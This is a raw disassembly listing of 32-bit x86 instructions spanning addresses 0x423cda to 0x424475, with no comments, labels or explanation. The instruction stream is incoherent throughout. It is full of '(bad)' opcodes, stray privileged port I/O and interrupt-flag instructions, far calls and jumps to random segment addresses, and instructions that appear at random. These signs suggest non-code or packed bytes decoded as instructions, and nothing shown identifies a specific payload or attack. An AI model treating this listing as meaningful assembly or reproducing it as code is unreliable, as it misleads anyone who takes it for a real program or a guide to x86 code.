  423cda:	jb     0x423cf5
  423cdc:	imul   edi,ebx,0xca49c450
  423ce2:	mov    eax,ds:0x2976ba03
  423ce7:	mov    dh,0x22
  423ce9:	ficomp WORD PTR [edx+0x511acaf8]
  423cef:	test   al,0x5b
  423cf1:	ins    BYTE PTR es:[edi],dx
  423cf2:	pop    ecx
  423cf3:	fidiv  WORD PTR [edx-0x70]
  423cf6:	dec    ebx
  423cf7:	jecxz  0x423c7f
  423cf9:	xlat   BYTE PTR ds:[ebx]
  423cfa:	aam    0xa4
  423cfc:	mov    WORD PTR [ebx+0x7e],gs
  423cff:	xchg   ecx,eax
  423d00:	(bad)  
  423d01:	imul   esp,DWORD PTR [esi],0x97a68b7c
  423d07:	mov    eax,ds:0xe72d78b6
  423d0c:	mov    ebp,DWORD PTR [eax+0x5c]
  423d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d10:	stos   DWORD PTR es:[edi],eax
  423d11:	pop    ebp
  423d12:	jnp    0x423d38
  423d14:	(bad)  
  423d15:	scas   al,BYTE PTR es:[edi]
  423d16:	sbb    esi,DWORD PTR [ebx+0x41]
  423d19:	push   esi
  423d1a:	adc    eax,0xb938cb5b
  423d1f:	xor    esp,0x2d
  423d22:	sar    DWORD PTR [ecx+0x65],0xf4
  423d26:	int3   
  423d27:	cli    
  423d28:	dec    esp
  423d29:	stos   BYTE PTR es:[edi],al
  423d2a:	das    
  423d2b:	xchg   DWORD PTR [ecx+0x6a],eax
  423d2e:	and    cl,dl
  423d30:	loope  0x423d6f
  423d32:	stos   DWORD PTR es:[edi],eax
  423d33:	pop    ss
  423d34:	add    ebp,DWORD PTR ds:0x22833c94
  423d3a:	dec    esp
  423d3b:	fist   WORD PTR [edx-0x5e]
  423d3e:	popa   
  423d3f:	adc    dl,BYTE PTR [eax+0x42]
  423d42:	sbb    al,0x6b
  423d44:	call   0x62bb:0x4be1ed56
  423d4b:	ror    DWORD PTR ds:0x86a9ea6d,cl
  423d51:	daa    
  423d52:	test   DWORD PTR [ebp+0x1321223c],esi
  423d58:	out    0x20,al
  423d5a:	and    ecx,DWORD PTR [esp+esi*1]
  423d5d:	jae    0x423d6d
  423d5f:	lea    ebx,[edi]
  423d61:	das    
  423d62:	mov    ds:0x92455cf8,al
  423d67:	aas    
  423d68:	adc    BYTE PTR [ebp+0x104b3155],dh
  423d6e:	adc    eax,ecx
  423d70:	pop    ebx
  423d71:	dec    ebx
  423d72:	mov    ds:0x97ab4b1,al
  423d77:	push   ebx
  423d78:	mov    al,0xf
  423d7a:	outs   dx,BYTE PTR ds:[esi]
  423d7b:	adc    BYTE PTR [ebp-0x54],ah
  423d7e:	dec    esi
  423d7f:	scas   eax,DWORD PTR es:[edi]
  423d80:	pushf  
  423d81:	jns    0x423dfe
  423d83:	sbb    DWORD PTR [ebx+0x2eaa654f],0x5d6b346c
  423d8d:	and    BYTE PTR [ebx],0x1d
  423d90:	in     al,0x73
  423d92:	data16 js 0x423da8
  423d95:	mov    eax,0x85003da
  423d9a:	inc    ebp
  423d9b:	popa   
  423d9c:	scas   al,BYTE PTR es:[edi]
  423d9d:	adc    dh,ch
  423d9f:	js     0x423d74
  423da1:	or     edx,DWORD PTR [ebx+0x7e]
  423da4:	leave  
  423da5:	mov    ss,WORD PTR ds:0xb2154a4d
  423dab:	xor    ebp,DWORD PTR cs:[esi-0x3a592a4d]
  423db2:	mov    esp,DWORD PTR fs:[ebp+edx*2-0x1a48f42a]
  423dba:	jmp    0xe93d:0x21cf760
  423dc1:	cmp    al,0x2
  423dc3:	fadd   DWORD PTR [ecx-0x27963cce]
  423dc9:	jno    0x423e04
  423dcb:	(bad)  
  423dcc:	pop    ds
  423dcd:	pop    ss
  423dce:	adc    bh,BYTE PTR [edi+eax*1-0x5c]
  423dd2:	mov    esi,0x4bae6861
  423dd7:	cli    
  423dd8:	sub    al,BYTE PTR [esi]
  423dda:	dec    ecx
  423ddb:	clc    
  423ddc:	lods   eax,DWORD PTR ds:[esi]
  423ddd:	mov    BYTE PTR [eax+0x19],bl
  423de0:	call   0x81fd:0x7c9fbfbf
  423de7:	add    BYTE PTR [edx-0x58],cl
  423dea:	mov    bh,0x5
  423dec:	add    ch,dl
  423dee:	xor    edx,edx
  423df0:	mov    edi,0x782eeb71
  423df5:	lds    ebp,FWORD PTR [edi+0x68f07821]
  423dfb:	imul   edx,DWORD PTR [eax],0x13
  423dfe:	add    eax,0x5b181cb5
  423e03:	test   al,0xe3
  423e05:	push   es
  423e06:	pop    ds
  423e07:	fwait
  423e08:	inc    edx
  423e09:	popf   
  423e0a:	sub    al,0xf5
  423e0c:	dec    edx
  423e0d:	ins    BYTE PTR es:[edi],dx
  423e0e:	pop    ss
  423e0f:	sbb    dl,BYTE PTR [ebx]
  423e11:	sub    eax,0x11930e31
  423e16:	add    dl,bh
  423e18:	push   cs
  423e19:	pop    esi
  423e1a:	std    
  423e1b:	icebp  
  423e1c:	mov    dh,0xd6
  423e1e:	push   eax
  423e1f:	or     BYTE PTR [edx+0x37],0x80
  423e23:	push   edi
  423e24:	je     0x423dfd
  423e26:	dec    esp
  423e27:	xchg   ebx,eax
  423e28:	repz rol BYTE PTR ss:[edx+0x5dabfff3],0x89
  423e31:	jbe    0x423eb0
  423e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e34:	repnz sti 
  423e36:	xor    BYTE PTR ds:0xd0aace32,0x7d
  423e3d:	pop    edi
  423e3e:	pop    DWORD PTR [esi+0x3a]
  423e41:	push   ecx
  423e42:	and    BYTE PTR [esi],cl
  423e44:	and    eax,0x7aa71c2e
  423e49:	inc    DWORD PTR [ebx]
  423e4b:	sub    edi,esp
  423e4d:	out    0x31,al
  423e4f:	test   al,0xae
  423e51:	xor    dl,bh
  423e53:	test   al,0x42
  423e55:	push   edx
  423e56:	pop    ebp
  423e57:	out    dx,al
  423e58:	cmp    esp,DWORD PTR [ebx]
  423e5a:	ja     0x423e04
  423e5c:	shr    BYTE PTR [eax],cl
  423e5e:	clc    
  423e5f:	push   esi
  423e60:	push   0x5cc6b048
  423e65:	ja     0x423e86
  423e67:	dec    ebp
  423e68:	jmp    0xf43:0x58f93f0a
  423e6f:	fdivr  QWORD PTR [ebp+eax*2+0x2f]
  423e73:	sbb    al,0xd1
  423e75:	jb     0x423edc
  423e77:	pop    es
  423e78:	pop    ecx
  423e79:	out    dx,al
  423e7a:	sti    
  423e7b:	push   0xffffff9e
  423e7d:	scas   eax,DWORD PTR es:[edi]
  423e7e:	iret   
  423e7f:	in     al,0xe0
  423e81:	cmc    
  423e82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e83:	adc    BYTE PTR [ebx],dh
  423e85:	xor    al,0x24
  423e87:	pop    eax
  423e88:	nop
  423e89:	popf   
  423e8a:	loope  0x423ef7
  423e8c:	jl     0x423e8d
  423e8e:	pop    ds
  423e8f:	ds push ebp
  423e91:	shl    bh,cl
  423e93:	outs   dx,BYTE PTR ds:[esi]
  423e94:	mov    BYTE PTR [ecx+0x60c30e7c],bh
  423e9a:	pop    eax
  423e9b:	push   0x108f43ee
  423ea0:	xchg   DWORD PTR [edx],ecx
  423ea2:	jmp    0x7ffe:0xfaf4cb18
  423ea9:	rcr    BYTE PTR [bp+si],cl
  423eac:	xchg   ebx,eax
  423ead:	mov    al,0x2f
  423eaf:	inc    edx
  423eb0:	pop    ds
  423eb1:	pop    esi
  423eb2:	sub    BYTE PTR [edi],dh
  423eb4:	xchg   ecx,eax
  423eb5:	sbb    al,0xa9
  423eb7:	add    eax,DWORD PTR [ebx+0x3f0033a7]
  423ebd:	js     0x423eab
  423ebf:	mov    ebx,0x914cb9fa
  423ec4:	popf   
  423ec5:	or     al,0xe3
  423ec8:	in     al,dx
  423ec9:	jnp    0x423f1a
  423ecb:	int    0x23
  423ecd:	or     cl,BYTE PTR [esp+edi*8+0x66]
  423ed1:	mov    al,ds:0x918a3712
  423ed6:	push   ebp
  423ed7:	and    DWORD PTR [ebx+0x714ac2a1],ecx
  423edd:	cli    
  423ede:	(bad)  
  423edf:	mov    dh,dl
  423ee1:	pop    eax
  423ee2:	push   esi
  423ee3:	bound  ebx,QWORD PTR [eax+0x4f]
  423ee6:	inc    edx
  423ee7:	push   edi
  423ee8:	dec    edi
  423ee9:	push   ebp
  423eea:	imul   ecx,DWORD PTR [eax-0x2a6059d7],0xc2e956e6
  423ef4:	inc    ebp
  423ef5:	test   al,0x92
  423ef7:	out    0x62,eax
  423ef9:	mov    ds:0xa6fa7108,al
  423efe:	push   ecx
  423eff:	adc    eax,0xd7adf953
  423f04:	mov    edi,0xbddaae
  423f09:	or     DWORD PTR [edx+0x564032a2],eax
  423f0f:	push   esp
  423f10:	fbstp  TBYTE PTR ds:0xbcdacd2e
  423f16:	cmp    ah,dh
  423f18:	popa   
  423f19:	push   0xb99ae8f9
  423f1e:	mov    bh,0x9b
  423f20:	sbb    ebx,edx
  423f22:	mov    esi,0x7f1727f5
  423f27:	inc    esi
  423f28:	outs   dx,BYTE PTR ds:[esi]
  423f29:	or     al,0x8c
  423f2b:	sbb    DWORD PTR [esi+0x33],ebx
  423f2e:	test   eax,0x209df395
  423f33:	nop
  423f34:	lsl    ebx,bp
  423f37:	jge    0x423ef2
  423f39:	and    ebx,ebx
  423f3b:	pushf  
  423f3c:	adc    ah,al
  423f3e:	mov    cl,0xb5
  423f40:	xchg   ebx,eax
  423f41:	xchg   ebx,eax
  423f42:	pop    es
  423f43:	mov    esi,0x7dfbbb8d
  423f48:	xlat   BYTE PTR ds:[ebx]
  423f49:	iret   
  423f4a:	lods   eax,DWORD PTR cs:[esi]
  423f4c:	adc    dh,ch
  423f4e:	fdiv   DWORD PTR [ebx+0x424af424]
  423f54:	jle    0x423f78
  423f56:	mov    eax,DWORD PTR [edi]
  423f58:	les    esi,FWORD PTR [ebx+0x36]
  423f5b:	mov    ds:0xf7c80557,eax
  423f60:	jle    0x423ef4
  423f62:	add    DWORD PTR [edx-0x28],esp
  423f65:	loopne 0x423f83
  423f67:	cwde   
  423f68:	pop    esi
  423f69:	fadd   QWORD PTR ds:0xabb4dab4
  423f6f:	out    0x77,al
  423f71:	xchg   ebx,eax
  423f72:	stos   BYTE PTR es:[edi],al
  423f73:	jle    0x423f0d
  423f75:	cld    
  423f76:	mov    BYTE PTR [ebp*1-0x34677e5b],0x62
  423f7e:	adc    eax,DWORD PTR [edi]
  423f80:	dec    ecx
  423f81:	push   ebp
  423f82:	jecxz  0x423ff0
  423f84:	sub    ecx,DWORD PTR [edi]
  423f86:	imul   ecx,DWORD PTR [ebp*8+0x671709ad],0xf89c551c
  423f91:	mov    DWORD PTR [ebp+0x55],edi
  423f94:	bound  edi,QWORD PTR [edx+0x591c0c00]
  423f9a:	pop    eax
  423f9b:	cdq    
  423f9c:	dec    ebx
  423f9d:	adc    eax,0x3636e9e8
  423fa2:	out    0x9,al
  423fa4:	xchg   ecx,eax
  423fa5:	push   0xc965bbe5
  423faa:	xchg   DWORD PTR [esi-0x15],ebp
  423fad:	xor    BYTE PTR [ecx],bl
  423faf:	repnz xchg esi,eax
  423fb1:	mov    dl,0xbd
  423fb3:	push   ss
  423fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fb5:	(bad)  
  423fb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fb7:	inc    esi
  423fb8:	jns    0x423ff8
  423fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fbb:	and    ah,BYTE PTR [eax+0x55f6c26a]
  423fc1:	test   BYTE PTR [esi-0x4c],dl
  423fc4:	in     eax,0x29
  423fc6:	outs   dx,DWORD PTR ds:[esi]
  423fc7:	in     al,0xed
  423fc9:	xor    al,0xc2
  423fcb:	add    cl,BYTE PTR [ecx]
  423fcd:	pop    edi
  423fce:	xchg   edi,eax
  423fcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423fd0:	loop   0x423f98
  423fd2:	cld    
  423fd3:	sbb    al,0xdd
  423fd5:	test   DWORD PTR [edi],ebp
  423fd7:	jg     0x423fd5
  423fd9:	gs jno 0x423f6f
  423fdc:	jmp    0x423f7e
  423fde:	pusha  
  423fdf:	jne    0x423ff2
  423fe1:	adc    BYTE PTR [edx-0x31db3591],dl
  423fe7:	push   ebp
  423fe8:	push   cs
  423fe9:	jnp    0x424006
  423feb:	xchg   ecx,ecx
  423fed:	test   DWORD PTR [ecx],0xcbf94b2a
  423ff3:	cmp    esp,edx
  423ff5:	cli    
  423ff6:	pusha  
  423ff7:	inc    ebx
  423ff8:	adc    eax,0x9a5cb0b5
  423ffd:	(bad)  
  423ffe:	aas    
  423fff:	pop    ebp
  424000:	adc    eax,0x2255121a
  424005:	pop    ecx
  424006:	jmp    0x424007
  424008:	sti    
  424009:	ja     0x424072
  42400b:	mov    bh,0xa8
  42400d:	(bad)  
  42400e:	call   0xc0a6595a
  424013:	ins    DWORD PTR es:[edi],dx
  424014:	test   al,0x38
  424016:	leave  
  424017:	dec    edx
  424018:	push   ebp
  424019:	mov    edx,0xc9bccfd5
  42401e:	lea    edx,[eax]
  424020:	adc    DWORD PTR [esi+0x35],edi
  424023:	pop    ebp
  424024:	push   edx
  424025:	push   ss
  424026:	sbb    eax,ebx
  424028:	or     BYTE PTR ds:0x46cd9f42,al
  42402e:	sub    BYTE PTR [ebx+0x79],bh
  424031:	gs (bad) 
  424033:	jp     0x42404b
  424035:	repz (bad) 
  424037:	push   eax
  424038:	and    eax,0x9e1b973a
  42403d:	enter  0xcb1f,0xc
  424041:	push   edx
  424042:	and    DWORD PTR ds:[edx-0x31],edi
  424046:	lds    edx,FWORD PTR [eax]
  424048:	inc    eax
  424049:	les    ebx,FWORD PTR [esi]
  42404b:	imul   ebx,DWORD PTR [ebx-0x612fd1a7],0xffffffee
  424052:	or     ebp,ecx
  424054:	pusha  
  424055:	mov    ch,0x94
  424057:	push   ebx
  424058:	pop    edx
  424059:	stos   DWORD PTR es:[edi],eax
  42405a:	je     0x42401c
  42405c:	fisubr DWORD PTR [eax+0x7588703b]
  424062:	adc    al,0xac
  424064:	jne    0x424074
  424066:	(bad)  [ebx+esi*8-0x2a]
  42406a:	dec    ebx
  42406b:	jp     0x42400c
  42406d:	call   ecx
  42406f:	out    0xa0,al
  424071:	ja     0x424048
  424073:	jmp    0x6c25ce18
  424078:	fisubr WORD PTR ds:0x4e3bff8
  42407e:	and    dl,BYTE PTR [ecx]
  424080:	imul   eax,ebp,0x63c99357
  424086:	add    eax,0x835c54ad
  42408b:	repnz mov ds:0x398214f7,al
  424091:	adc    al,0xe5
  424093:	adc    bl,BYTE PTR [edi+0x3439e7f2]
  424099:	rcl    DWORD PTR [ebx],cl
  42409b:	call   0x8741:0xd3441858
  4240a2:	lods   eax,DWORD PTR ds:[esi]
  4240a3:	out    dx,eax
  4240a4:	ret    0x68f9
  4240a7:	adc    al,dh
  4240a9:	pop    ebp
  4240aa:	fdiv   DWORD PTR [ecx-0xcc76b5a]
  4240b0:	aam    0xd1
  4240b2:	je     0x42403e
  4240b4:	packuswb mm4,mm6
  4240b7:	or     eax,0x432c0cf8
  4240bc:	js     0x424100
  4240be:	xor    esi,DWORD PTR [ecx]
  4240c0:	push   ss
  4240c1:	pop    ecx
  4240c2:	into   
  4240c3:	adc    ecx,DWORD PTR ds:0xafe4d75f
  4240c9:	mov    DWORD PTR [eax-0x2d],ebx
  4240cc:	sbb    eax,0xac0f0163
  4240d1:	iret   
  4240d2:	repz pop DWORD PTR [ebp-0x69]
  4240d6:	stos   BYTE PTR es:[edi],al
  4240d7:	fwait
  4240d8:	ins    DWORD PTR es:[edi],dx
  4240d9:	jbe    0x4240e1
  4240db:	inc    eax
  4240dc:	jo     0x42408e
  4240de:	inc    ebp
  4240df:	xchg   BYTE PTR [ecx-0x1e],ch
  4240e2:	push   eax
  4240e3:	sub    DWORD PTR [eax],ebx
  4240e5:	fisttp DWORD PTR [edi-0x12]
  4240e8:	xchg   esp,eax
  4240e9:	mov    WORD PTR [edi-0x66],?
  4240ec:	js     0x4240d2
  4240ee:	retf   
  4240ef:	scas   eax,DWORD PTR es:[edi]
  4240f0:	jecxz  0x42407c
  4240f2:	jle    0x42408d
  4240f4:	mov    esp,0x7eb9fe92
  4240f9:	jnp    0x4240e0
  4240fb:	lods   eax,DWORD PTR ds:[esi]
  4240fc:	ds repz and esp,edi
  424100:	pushf  
  424101:	pop    edx
  424102:	push   ebx
  424103:	pop    ss
  424104:	fst    QWORD PTR ds:0x6eecb2f9
  42410a:	mov    esp,0xe2ecf37f
  42410f:	std    
  424110:	push   esi
  424111:	pop    es
  424112:	cmp    bh,BYTE PTR [eax]
  424114:	retf   
  424115:	out    0xd7,al
  424117:	cmp    ah,ch
  424119:	jbe    0x42411d
  42411b:	xchg   edx,eax
  42411c:	and    al,0x5a
  42411e:	mov    es,WORD PTR [eax+eax*1+0x79c54b9e]
  424125:	out    0x42,eax
  424127:	fiadd  DWORD PTR [esi-0x53]
  42412a:	loope  0x4240da
  42412c:	jae    0x424103
  42412e:	je     0x424170
  424130:	dec    ebp
  424131:	ret    0x2d32
  424134:	lds    ebp,FWORD PTR [ebx]
  424136:	mov    esi,0x5ccd3feb
  42413b:	lahf   
  42413c:	sbb    DWORD PTR [edx+0x56],0xffffffff
  424140:	cmp    edx,DWORD PTR [edi-0x77]
  424143:	std    
  424144:	jg     0x42417b
  424146:	pushf  
  424147:	mov    ds:0x5dc9e31a,eax
  42414c:	mov    edi,0x846c935c
  424151:	out    0x9e,eax
  424153:	xchg   esi,eax
  424154:	(bad)  
  424155:	mov    al,ds:0x6acf4a49
  42415a:	add    cl,ch
  42415c:	add    DWORD PTR [ecx-0x1b56cc45],edx
  424162:	dec    edx
  424163:	adc    al,0x2a
  424165:	out    dx,eax
  424166:	mov    edi,0xcc81b02f
  42416b:	dec    ebp
  42416c:	ffreep st(6)
  42416e:	cld    
  42416f:	cmc    
  424170:	pop    ds
  424171:	xor    DWORD PTR [esi+edi*2+0x63c818a6],edx
  424178:	pop    edi
  424179:	xchg   BYTE PTR [ecx-0x3c],ah
  42417c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42417d:	cmp    DWORD PTR [ebx+0x28],ecx
  424180:	sbb    bl,bh
  424182:	aaa    
  424183:	push   ebx
  424184:	jne    0x4241dc
  424186:	jae    0x4241ff
  424188:	mov    bh,0xa6
  42418a:	repz mov ecx,edx
  42418d:	gs call 0x82a4:0xbaa10dcc
  424195:	sub    eax,0xda17505d
  42419a:	mov    ch,BYTE PTR [edx]
  42419c:	call   0x45d7c004
  4241a1:	pop    ebx
  4241a2:	adc    ch,BYTE PTR [ebx+0x54d31404]
  4241a8:	mov    ebx,0x88808034
  4241ad:	dec    esi
  4241ae:	repz inc esp
  4241b0:	out    dx,al
  4241b1:	sub    eax,ecx
  4241b3:	push   ds
  4241b4:	pop    es
  4241b5:	std    
  4241b6:	jnp    0x424150
  4241b8:	or     al,0x70
  4241ba:	fdivr  QWORD PTR [eax+ebx*2-0x6a156c5f]
  4241c1:	sbb    bl,bl
  4241c3:	retf   
  4241c4:	stos   DWORD PTR es:[edi],eax
  4241c5:	sub    al,0x5a
  4241c7:	push   ss
  4241c8:	or     BYTE PTR gs:[ebx-0x7d],cl
  4241cc:	push   cs
  4241cd:	push   ecx
  4241ce:	mov    ds:0xb433a52d,eax
  4241d3:	cmp    ch,bh
  4241d5:	icebp  
  4241d6:	out    0x4d,eax
  4241d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241d9:	sub    al,0x92
  4241db:	stos   BYTE PTR es:[edi],al
  4241dc:	dec    edx
  4241dd:	mov    eax,esi
  4241df:	xchg   BYTE PTR [esi+0x27],dh
  4241e2:	cmc    
  4241e3:	mov    dh,0x1a
  4241e5:	dec    ebp
  4241e6:	fild   WORD PTR [edi]
  4241e8:	cs pop esi
  4241ea:	mov    esi,0x6bf3ca26
  4241ef:	jg     0x424255
  4241f1:	enter  0xd5fb,0x62
  4241f5:	aas    
  4241f6:	sar    DWORD PTR [ebx],1
  4241f8:	or     BYTE PTR [ecx+0x4e4fbfc5],0xf6
  4241ff:	aas    
  424200:	inc    ecx
  424201:	int3   
  424202:	aaa    
  424203:	cmp    eax,DWORD PTR [edx+0x10]
  424206:	test   DWORD PTR [esi],esi
  424208:	add    eax,0xbfe6e655
  42420d:	(bad)  
  42420f:	imul   eax,edi,0x73
  424212:	add    al,0xb8
  424214:	dec    eax
  424215:	push   0xfffffff8
  424217:	es (bad) 
  424219:	xchg   esi,eax
  42421a:	leave  
  42421b:	mov    al,0x38
  42421d:	jae    0x42429d
  42421f:	push   edx
  424220:	or     edi,DWORD PTR [edi-0x525dfab9]
  424226:	or     al,0x21
  424228:	dec    ebx
  424229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42422a:	mov    ch,0xb1
  42422c:	iret   
  42422d:	dec    ebp
  42422e:	xchg   edx,esi
  424230:	xchg   DWORD PTR [ecx+0x35],edx
  424233:	icebp  
  424234:	scas   eax,DWORD PTR es:[edi]
  424235:	xor    eax,ecx
  424237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424238:	jne    0x42420e
  42423a:	out    dx,al
  42423b:	fiadd  WORD PTR [ebp+0x3c]
  42423e:	shr    DWORD PTR [ecx+0xd],1
  424241:	push   ebp
  424242:	sbb    BYTE PTR [edi],al
  424244:	push   esi
  424245:	js     0x4241d7
  424247:	and    DWORD PTR [esi-0x4895cf6f],0x19
  42424e:	sub    eax,0x4a3f5099
  424253:	stos   DWORD PTR es:[edi],eax
  424254:	mov    ecx,0x94145557
  424259:	scas   eax,DWORD PTR es:[edi]
  42425a:	inc    edi
  42425b:	jmp    0x95ec0199
  424260:	pushf  
  424261:	scas   eax,DWORD PTR es:[di]
  424263:	inc    edx
  424264:	cs pop ecx
  424266:	push   esp
  424267:	sub    ch,BYTE PTR [eax+0x12]
  42426a:	sub    DWORD PTR [edx],edi
  42426c:	(bad)  
  42426e:	push   ds
  42426f:	xchg   ebp,eax
  424270:	dec    ebp
  424271:	fs cwde 
  424273:	ret    0x2493
  424276:	xor    al,BYTE PTR [esi-0x73a2fd3]
  42427c:	cmp    esi,esi
  42427e:	and    al,0x86
  424280:	sbb    cl,BYTE PTR [edx+0x5b]
  424283:	imul   esp,DWORD PTR [ecx],0x7c6730f
  424289:	retf   
  42428a:	retf   
  42428b:	sti    
  42428c:	cmp    dl,bl
  42428e:	(bad)  [ebp+0x71]
  424291:	nop
  424292:	fstp   DWORD PTR [ecx+0x3b]
  424295:	and    eax,0x9ff6cad6
  42429a:	xchg   ebp,eax
  42429b:	xchg   edx,eax
  42429c:	das    
  42429d:	and    al,0xb7
  42429f:	and    eax,DWORD PTR ds:0x8ed24877
  4242a5:	mov    al,ds:0x5bd827a9
  4242aa:	stos   DWORD PTR es:[edi],eax
  4242ab:	(bad)  
  4242ad:	adc    dh,bh
  4242af:	aam    0x7b
  4242b1:	and    DWORD PTR [ebp+ebp*8+0x1b4b50e0],eax
  4242b8:	call   0xa0c7:0x8beb6268
  4242bf:	adc    DWORD PTR [ecx-0x72],edi
  4242c2:	(bad)  
  4242c3:	sti    
  4242c4:	mov    edx,0x20e3e16a
  4242c9:	add    esp,DWORD PTR [esi]
  4242cb:	daa    
  4242cc:	daa    
  4242cd:	adc    dl,cl
  4242cf:	jp     0x4242c4
  4242d1:	pop    ebp
  4242d2:	sbb    al,0xa7
  4242d4:	mov    ebx,0x10eafef5
  4242d9:	out    0x52,eax
  4242db:	cmp    DWORD PTR [edx+0x7c352864],esp
  4242e1:	mov    al,0x84
  4242e3:	mov    WORD PTR [edi-0x3d],cs
  4242e6:	pushf  
  4242e7:	ss repnz lahf 
  4242ea:	add    al,0x54
  4242ec:	xchg   esi,eax
  4242ed:	mov    ch,0x72
  4242ef:	pushf  
  4242f0:	mov    al,0xa0
  4242f2:	push   es
  4242f3:	push   ss
  4242f4:	xor    BYTE PTR [ebx+0x1afd61a4],ch
  4242fa:	bound  esp,QWORD PTR [edi]
  4242fc:	mov    al,0x13
  4242fe:	iret   
  4242ff:	sbb    esi,DWORD PTR [esi-0x510cefde]
  424305:	imul   esi,DWORD PTR [ebp+0x55e54b09],0xffffffdc
  42430c:	add    eax,0x27dca1c6
  424311:	add    DWORD PTR [esi+0x64],edi
  424314:	or     BYTE PTR [ebx+edi*8+0x73ac0f9],ch
  42431b:	adc    eax,0x8e6f2a2d
  424320:	and    BYTE PTR [edi+0x118e696f],al
  424326:	jp     0x42436d
  424328:	mov    bl,0x3e
  42432a:	xchg   BYTE PTR [edi-0x4223ad4f],cl
  424330:	nop
  424331:	pop    ebp
  424332:	(bad)  
  424333:	xor    esi,DWORD PTR ds:0x4fe452db
  424339:	push   esp
  42433a:	push   ds
  42433b:	mov    ds:0x4ce0cb2a,al
  424340:	stos   BYTE PTR es:[edi],al
  424341:	stos   DWORD PTR es:[di],eax
  424343:	and    eax,0xb312a1ec
  424348:	mov    dl,BYTE PTR [edx]
  42434a:	popf   
  42434b:	fcmovne st,st(2)
  42434d:	outs   dx,BYTE PTR ds:[esi]
  42434e:	pop    esp
  42434f:	and    al,0x76
  424351:	repnz out dx,eax
  424353:	jge    0x4243ba
  424355:	dec    edx
  424356:	cli    
  424357:	in     al,0x3
  424359:	stc    
  42435a:	dec    eax
  42435b:	test   al,0x3
  42435d:	mov    ecx,0xa01448a6
  424362:	sub    DWORD PTR [eax],0xe9a5b1
  424368:	jge    0x4243ab
  42436a:	or     BYTE PTR [edi-0x17327f61],ch
  424370:	inc    esp
  424371:	into   
  424372:	(bad)  
  424373:	out    dx,al
  424374:	addr16 aad 0xe5
  424377:	or     eax,0x445daa78
  42437c:	in     al,dx
  42437d:	sbb    ch,dl
  42437f:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  424381:	mov    edx,0x7d5fce56
  424386:	imul   edi,ebp,0x3e87cb78
  42438c:	fist   DWORD PTR [esi+0x3a]
  42438f:	sbb    DWORD PTR [esi-0x6e7e52dd],0xffffffa1
  424396:	shr    BYTE PTR [edi],cl
  424398:	sbb    bh,BYTE PTR [edi+0x6]
  42439b:	and    dh,0xa
  42439e:	mov    ebx,edi
  4243a0:	xchg   edi,eax
  4243a1:	(bad)  
  4243a2:	mov    eax,0x4cb77321
  4243a7:	in     al,0xbb
  4243a9:	xchg   edx,eax
  4243aa:	(bad)  
  4243ac:	cmp    edi,DWORD PTR [ebx-0x14]
  4243af:	ss retf 0x54de
  4243b3:	pop    ebx
  4243b4:	mov    ah,0xab
  4243b6:	dec    ebx
  4243b7:	xchg   ebp,eax
  4243b8:	jecxz  0x4243b5
  4243ba:	xor    DWORD PTR [edi+0x1eacaea4],0xffffffbe
  4243c1:	dec    ebx
  4243c2:	clc    
  4243c3:	stc    
  4243c4:	xor    ah,BYTE PTR [edx]
  4243c6:	cmc    
  4243c7:	mul    al
  4243c9:	pushf  
  4243ca:	pop    eax
  4243cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243cc:	push   ebp
  4243cd:	repz jbe 0x424402
  4243d0:	shr    DWORD PTR [ecx+0x26],0xba
  4243d4:	push   es
  4243d5:	std    
  4243d6:	std    
  4243d7:	imul   ebp,DWORD PTR [esi+0x1983ec2],0xffffffd2
  4243de:	inc    ebx
  4243df:	ja     0x4243ed
  4243e1:	jmp    0x42445c
  4243e3:	dec    ecx
  4243e4:	addr16 loop 0x42445b
  4243e7:	pushf  
  4243e8:	mov    ecx,0x882e2a02
  4243ed:	mov    dl,0xa0
  4243ef:	shl    DWORD PTR [ecx],0xc6
  4243f2:	test   edi,ebx
  4243f4:	xchg   edx,eax
  4243f5:	lock jne 0x424443
  4243f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243f9:	fisub  WORD PTR [edx+0x38]
  4243fc:	pop    ecx
  4243fd:	outs   dx,DWORD PTR ds:[esi]
  4243fe:	test   DWORD PTR [edx-0x7ee140f7],ebp
  424404:	rol    DWORD PTR [ebp+edx*1-0x84384fe],0x89
  42440c:	inc    ebp
  42440d:	push   cs
  42440e:	cmc    
  42440f:	or     BYTE PTR [edx-0x62cd7bcb],ch
  424415:	aam    0x3c
  424417:	lahf   
  424418:	jns    0x424478
  42441a:	add    DWORD PTR [ebp+0x29],0x18
  42441e:	pusha  
  42441f:	lds    ebx,FWORD PTR ds:0x1ae6f860
  424425:	sbb    al,0xdf
  424427:	ret    0xd53f
  42442a:	retw   
  42442c:	dec    esp
  42442d:	push   0x3ad3e22
  424432:	rcl    DWORD PTR [edi],0x2c
  424435:	out    0x4d,eax
  424437:	mov    ah,0x7c
  424439:	sbb    BYTE PTR [edi-0x5a],0x84
  42443d:	out    0xc9,al
  42443f:	in     al,dx
  424440:	cld    
  424441:	mov    WORD PTR ds:0xa95b08af,?
  424447:	lds    ebx,FWORD PTR [esi+0x2e4c6ec8]
  42444d:	inc    ecx
  42444e:	outs   dx,BYTE PTR ds:[esi]
  42444f:	push   ecx
  424450:	(bad)  
  424451:	pop    ebp
  424452:	and    DWORD PTR [ebx],ebp
  424454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424455:	adc    cl,al
  424457:	jae    0x4243ed
  424459:	call   0xc83:0x1ae59421
  424460:	shl    BYTE PTR [edi],cl
  424462:	pop    es
  424463:	push   edx
  424464:	push   ds
  424465:	cmp    esp,DWORD PTR [edx-0x2f]
  424468:	imul   eax,DWORD PTR [edx],0x7c
  42446b:	and    BYTE PTR [ebx-0x62],0x4d
  42446f:	inc    edx
  424470:	rcr    DWORD PTR [edx+edi*1-0x5e],0xeb
  424475:	push   ds
